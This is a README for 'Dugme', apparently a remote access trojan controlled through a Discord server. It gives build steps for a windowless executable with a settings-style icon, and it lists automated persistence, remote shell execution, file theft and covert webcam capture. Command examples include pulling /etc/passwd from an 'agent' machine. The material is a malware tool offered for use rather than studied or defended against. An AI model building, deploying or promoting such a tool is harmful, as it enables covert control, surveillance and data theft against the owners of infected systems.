
# Dugme

A discord command on control script to control multiple system from 1 discord server.






![Logo](https://i.imgur.com/Euc1r2V.png)


## Installation

Install and run with python

```bash
  git clone https://github.com/Rahim7x/dugme.git
  cd dugme
  pip install -r requirements.txt
  python dugme.py
```

Create an executable

```bash
pip install pyinstaller
pyinstaller dugme.py --onefile --noconsole --icon settings.ico
```


    
## Features

- Run via python
- Run like any normal executable
- automated peristance
- run any command
- take pictures from webcam
- send any files



## dugme commands

- Check online clients 
```bash
!session
```
- Execute system commands
```bash
!shell.<client_username> ls # For Linux

# Eg :
!shell.agent1 dir
```

- Download file from system
```bash
!getfile.<client_username> /file_path

# Eg :
!getfile.agent1 /etc/passed
```

- upload a file via sendint trough attachments
```bash
!savefile.<client_username> # + Attachment
```

- Take phot via webcam
```bash
!camsnap.client_username
```



## Author

- [@rahim7x](https://www.github.com/rahim7x)

